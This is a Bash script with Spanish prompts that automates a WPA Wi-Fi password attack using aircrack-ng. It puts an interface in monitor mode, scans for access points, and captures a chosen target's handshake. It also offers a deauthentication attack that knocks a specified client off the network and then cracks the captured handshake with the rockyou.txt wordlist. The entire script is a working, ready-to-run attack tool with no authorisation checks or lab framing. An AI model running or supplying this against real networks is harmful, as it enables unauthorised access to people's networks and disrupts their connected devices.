#!/bin/bash

# Comprobación de permisos de superusuario
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31mPor favor, ejecuta este script como superusuario (root).\e[0m"
  exit
fi

# Colores
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
CYAN='\e[36m'
NC='\e[0m' # No Color

# Directorios predeterminados
LOGS_DIR="./logs"
DICTIONARY_DIR="./diccionarios"
DEFAULT_DICTIONARY="$DICTIONARY_DIR/rockyou.txt"

# Banner
echo -e "${CYAN}"
echo "  ____       _                     _       _   _                 _   "
echo " |  _ \ __ _| | ___ _ __ ___  _ __(_) __ _| |_| |__   __ _ _ __ | |_ "
echo " | |_) / _\` | |/ _ \ '__/ _ \| '__| |/ _\` | __| '_ \ / _\` | '_ \| __|"
echo " |  __/ (_| | |  __/ | | (_) | |  | | (_| | |_| | | | (_| | | | | |_ "
echo " |_|   \__,_|_|\___|_|  \___/|_|  |_|\__,_|\__|_| |_|\__,_|_| |_|\__|"
echo "                                                                   "
echo -e "${NC}"

# Crear directorios si no existen
mkdir -p $LOGS_DIR
mkdir -p $DICTIONARY_DIR

# Actualizar y instalar aircrack-ng si no está instalado
echo -e "${YELLOW}Actualizando los repositorios y verificando la instalación de aircrack-ng...${NC}"
apt update && apt install -y aircrack-ng

# Paso 1: Listar las interfaces Wi-Fi disponibles
echo -e "${CYAN}Detectando las interfaces Wi-Fi disponibles...${NC}"
airmon-ng
echo
read -p "Introduce el nombre de la interfaz Wi-Fi que deseas usar (ej. wlan0): " INTERFACE

# Paso 2: Habilitar el modo monitor
echo -e "${CYAN}Habilitando el modo monitor en la interfaz $INTERFACE...${NC}"
airmon-ng start $INTERFACE

# Confirmar el nombre de la nueva interfaz en modo monitor
MON_INTERFACE="${INTERFACE}mon"
echo -e "${GREEN}La interfaz en modo monitor es: $MON_INTERFACE${NC}"
echo

# Paso 3: Escanear redes Wi-Fi disponibles
echo -e "${CYAN}Escaneando las redes Wi-Fi disponibles...${NC}"
echo -e "${YELLOW}Presiona Ctrl+C una vez que hayas encontrado el AP objetivo.${NC}"
sleep 3
LOG_FILE="$LOGS_DIR/handshake_scan_$(date +'%Y%m%d_%H%M%S').cap"
airodump-ng $MON_INTERFACE

# Paso 4: Seleccionar el AP objetivo
echo
read -p "Introduce el BSSID del AP objetivo: " BSSID
read -p "Introduce el canal del AP (CH): " CHANNEL

# Paso 5: Capturar el handshake
echo -e "${CYAN}Capturando handshake en el AP con BSSID $BSSID en el canal $CHANNEL...${NC}"
echo -e "${YELLOW}Mantén el escaneo hasta que captures el handshake.${NC}"
airodump-ng --bssid $BSSID --channel $CHANNEL --write $LOG_FILE $MON_INTERFACE

echo -e "${GREEN}Los resultados han sido guardados en $LOG_FILE${NC}"
echo

# Paso 6: (Opcional) Forzar la captura del handshake mediante un ataque de deauth
echo -e "${YELLOW}¿Quieres forzar la captura del handshake desconectando a un cliente?${NC}"
read -p "Introduce la dirección MAC del cliente objetivo (deja en blanco para saltar este paso): " TARGET_MAC

if [ ! -z "$TARGET_MAC" ]; then
  echo -e "${RED}Realizando un ataque de deauth al dispositivo con MAC $TARGET_MAC...${NC}"
  aireplay-ng --deauth 10 -a $BSSID -c $TARGET_MAC $MON_INTERFACE
fi

# Paso 7: Verificar la Captura del Handshake
echo -e "${CYAN}Verificando si el handshake fue capturado...${NC}"
aircrack-ng $LOG_FILE-01.cap

# Paso 8: Desencriptar el Handshake (Opcional)
echo -e "${YELLOW}¿Deseas intentar desencriptar el handshake utilizando un diccionario? (S/N)${NC}"
read -p "Introduce S para Sí o N para No: " DECRYPT_CHOICE

if [[ "$DECRYPT_CHOICE" =~ ^[Ss]$ ]]; then
  read -p "Introduce la ruta del diccionario (deja en blanco para usar rockyou.txt): " DICTIONARY

  # Usar el diccionario predeterminado si el usuario deja el campo en blanco
  if [ -z "$DICTIONARY" ]; then
    DICTIONARY=$DEFAULT_DICTIONARY
    echo -e "${CYAN}Usando el diccionario predeterminado: $DICTIONARY${NC}"
  fi

  if [ ! -f "$DICTIONARY" ]; then
    echo -e "${RED}El diccionario especificado no existe. Asegúrate de que la ruta es correcta.${NC}"
    exit 1
  fi

  echo -e "${CYAN}Intentando desencriptar el handshake con el diccionario $DICTIONARY...${NC}"
  aircrack-ng -w $DICTIONARY -b $BSSID $LOG_FILE-01.cap
fi

# Paso 9: Deshabilitar el modo monitor y volver al modo gestionado
echo -e "${CYAN}Deshabilitando el modo monitor...${NC}"
airmon-ng stop $MON_INTERFACE

echo -e "${GREEN}Proceso completado.${NC}"
